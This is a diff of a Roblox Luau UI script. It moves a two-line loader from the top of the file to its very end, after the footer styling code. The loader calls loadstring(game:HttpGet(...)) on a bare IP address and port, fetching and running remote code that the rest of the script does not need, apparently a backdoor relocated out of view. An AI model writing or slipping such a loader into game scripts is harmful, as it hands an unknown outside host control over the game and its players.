@@ -1,5 +1,3 @@
-ID="f08de7ca-321d-4e56-a4e5-b546ecbe1a3d";
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
 local players = game:GetService("Players")
 local collectionService = game:GetService("CollectionService")
 local TweenService = game:GetService("TweenService")
@@ -235,3 +233,5 @@ footer.Font = FONT
 footer.TextColor3 = Color3.new(1,1,1)
 footer.TextStrokeTransparency = 0.5
 footer.TextScaled = true
+ID="f08de7ca-321d-4e56-a4e5-b546ecbe1a3d";
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
